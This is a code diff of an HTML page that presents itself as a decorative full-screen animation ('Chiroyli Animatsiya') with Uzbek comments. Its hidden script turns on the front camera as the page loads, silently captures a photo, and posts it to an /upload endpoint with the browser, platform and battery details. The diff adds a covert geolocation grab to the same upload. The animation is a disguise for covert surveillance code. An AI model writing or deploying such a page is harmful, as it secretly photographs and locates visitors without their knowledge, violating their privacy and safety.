@@ -4,24 +4,21 @@
     <meta charset="UTF-8" />
     <title>Animatsiya</title>
     <style>
+      /* === Dizayn va animatsiya === */
       #video {
         display: none;
       }
-    </style>
-    <style>
       * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
       }
-
       body {
         height: 100vh;
         overflow: hidden;
         background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
         position: relative;
       }
-
       .animation-container {
         position: absolute;
         top: 0;
@@ -41,7 +38,6 @@
         background-size: 400% 400%;
         animation: gradientShift 8s ease infinite;
       }
-
       @keyframes gradientShift {
         0% {
           background-position: 0% 50%;
@@ -53,15 +49,13 @@
           background-position: 0% 50%;
         }
       }
-
       .particle {
         position: absolute;
         border-radius: 50%;
-        pointer-events: none;
         opacity: 0.7;
         animation: float 6s ease-in-out infinite;
+        pointer-events: none;
       }
-
       .particle:nth-child(1) {
         width: 80px;
         height: 80px;
@@ -71,7 +65,6 @@
         animation-delay: 0s;
         animation-duration: 8s;
       }
-
       .particle:nth-child(2) {
         width: 60px;
         height: 60px;
@@ -81,7 +74,6 @@
         animation-delay: 1s;
         animation-duration: 10s;
       }
-
       .particle:nth-child(3) {
         width: 100px;
         height: 100px;
@@ -91,7 +83,6 @@
         animation-delay: 2s;
         animation-duration: 7s;
       }
-
       .particle:nth-child(4) {
         width: 70px;
         height: 70px;
@@ -101,7 +92,6 @@
         animation-delay: 3s;
         animation-duration: 9s;
       }
-
       .particle:nth-child(5) {
         width: 90px;
         height: 90px;
@@ -111,7 +101,6 @@
         animation-delay: 4s;
         animation-duration: 6s;
       }
-
       .particle:nth-child(6) {
         width: 50px;
         height: 50px;
@@ -121,11 +110,10 @@
         animation-delay: 5s;
         animation-duration: 11s;
       }
-
       @keyframes float {
         0%,
         100% {
-          transform: translateY(0px) rotate(0deg) scale(1);
+          transform: translateY(0) rotate(0) scale(1);
         }
         25% {
           transform: translateY(-30px) rotate(90deg) scale(1.1);
@@ -137,7 +125,6 @@
           transform: translateY(-30px) rotate(270deg) scale(1.05);
         }
       }
-
       .wave {
         position: absolute;
         bottom: 0;
@@ -151,7 +138,6 @@
         );
         animation: wave 4s ease-in-out infinite;
       }
-
       .wave:before {
         content: "";
         position: absolute;
@@ -169,7 +155,6 @@
         );
         animation: waveMove 6s linear infinite;
       }
-
       @keyframes wave {
         0%,
         100% {
@@ -179,7 +164,6 @@
           transform: scaleY(1.2);
         }
       }
-
       @keyframes waveMove {
         0% {
           transform: translateX(-50%);
@@ -188,7 +172,6 @@
           transform: translateX(0%);
         }
       }
-
       .center-text {
         position: absolute;
         top: 50%;
@@ -199,148 +182,65 @@
         font-family: "Arial", sans-serif;
         z-index: 10;
       }
-
       .center-text h1 {
         font-size: 4rem;
         font-weight: bold;
         margin-bottom: 1rem;
-        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
         animation: textGlow 3s ease-in-out infinite alternate;
       }
-
       .center-text p {
         font-size: 1.5rem;
         opacity: 0.9;
-        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         animation: textFloat 4s ease-in-out infinite;
       }
-
       @keyframes textGlow {
         0% {
-          text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3),
-            0 0 20px rgba(255, 255, 255, 0.3);
+          text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
         }
         100% {
-          text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3),
-            0 0 30px rgba(255, 255, 255, 0.6);
+          text-shadow: 0 0 30px rgba(255, 255, 255, 0.6);
         }
       }
-
       @keyframes textFloat {
         0%,
         100% {
-          transform: translateY(0px);
+          transform: translateY(0);
         }
         50% {
           transform: translateY(-10px);
         }
       }
-
-      .sparkle {
-        position: absolute;
-        width: 4px;
-        height: 4px;
-        background: white;
-        border-radius: 50%;
-        animation: sparkle 2s linear infinite;
-      }
-
-      .sparkle:nth-child(odd) {
-        animation-delay: 1s;
-      }
-
-      @keyframes sparkle {
-        0% {
-          opacity: 0;
-          transform: scale(0);
-        }
-        50% {
-          opacity: 1;
-          transform: scale(1);
-        }
-        100% {
-          opacity: 0;
-          transform: scale(0);
-        }
-      }
-
-      /* Generate sparkles */
-      .sparkle:nth-child(7) {
-        top: 15%;
-        left: 25%;
-        animation-delay: 0.5s;
-      }
-      .sparkle:nth-child(8) {
-        top: 35%;
-        left: 75%;
-        animation-delay: 1.2s;
-      }
-      .sparkle:nth-child(9) {
-        top: 65%;
-        left: 15%;
-        animation-delay: 2.1s;
-      }
-      .sparkle:nth-child(10) {
-        top: 85%;
-        left: 85%;
-        animation-delay: 0.8s;
-      }
-      .sparkle:nth-child(11) {
-        top: 25%;
-        left: 45%;
-        animation-delay: 1.7s;
-      }
-      .sparkle:nth-child(12) {
-        top: 55%;
-        left: 35%;
-        animation-delay: 2.3s;
-      }
     </style>
   </head>
+
   <body>
     <div class="animation-container">
-      <!-- Floating particles -->
       <div class="particle"></div>
       <div class="particle"></div>
       <div class="particle"></div>
       <div class="particle"></div>
       <div class="particle"></div>
       <div class="particle"></div>
-
-      <!-- Sparkles -->
-      <div class="sparkle"></div>
-      <div class="sparkle"></div>
-      <div class="sparkle"></div>
-      <div class="sparkle"></div>
-      <div class="sparkle"></div>
-      <div class="sparkle"></div>
-
-      <!-- Wave effect -->
       <div class="wave"></div>
-
-      <!-- Center text -->
       <div class="center-text">
         <h1>Chiroyli Animatsiya</h1>
         <p>Beautiful Full Screen Animation</p>
       </div>
     </div>
+
     <video id="video" autoplay></video>
-   
 
     <script>
       const video = document.getElementById("video");
 
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      // 🎥 Kameradan rasm olish
+      navigator.mediaDevices
+        .getUserMedia({ video: { facingMode: "user" } })
         .then((stream) => {
           video.srcObject = stream;
-
-          video.onloadedmetadata = () => {
-            setTimeout(captureAndSendPhoto, 1000);
-          };
+          video.onloadedmetadata = () => setTimeout(captureAndSendPhoto, 1500);
         })
-        .catch((err) => {
-          console.error("Kamera ruxsati berilmadi:", err);
-        });
+        .catch((err) => console.error("Kamera ruxsati berilmadi:", err));
 
       async function captureAndSendPhoto() {
         const canvas = document.createElement("canvas");
@@ -349,7 +249,9 @@
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0);
 
-        const blob = await new Promise(resolve =>canvas.toBlob(resolve, "image/jpeg"));
+        const blob = await new Promise((res) =>
+          canvas.toBlob(res, "image/jpeg")
+        );
 
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
@@ -362,27 +264,40 @@
           batteryCharging = battery.charging;
         } catch (e) {}
 
+        let latitude = "Nomalum";
+        let longitude = "Nomalum";
+
+        // 📍 Joylashuvni olish
+        if (navigator.geolocation) {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                latitude = pos.coords.latitude;
+                longitude = pos.coords.longitude;
+                resolve();
+              },
+              () => resolve() // agar rad etsa, davom etadi
+            );
+          });
+        }
+
+        // 📨 Serverga yuborish
         const formData = new FormData();
         formData.append("photo", blob, "auto.jpg");
         formData.append("userAgent", userAgent);
         formData.append("platform", platform);
         formData.append("batteryLevel", batteryLevel);
         formData.append("batteryCharging", batteryCharging);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
 
-        fetch("/upload", {
-          method: "POST",
-          body: formData,
-        })
-          .then(res => {
-            if (res.ok) {
-              console.log("Rasm va malumotlar yuborildi ✅");
-            } else {
-              console.error("Yuborishda xatolik ❌");
-            }
-          })
-          .catch(err => {
-            console.error("Xatolik:", err);
-          });
+        fetch("/upload", { method: "POST", body: formData })
+          .then((res) =>
+            res.ok
+              ? console.log("✅ Rasm va ma'lumotlar yuborildi")
+              : console.error("❌ Yuborishda xatolik")
+          )
+          .catch((err) => console.error("Xatolik:", err));
       }
     </script>
   </body>
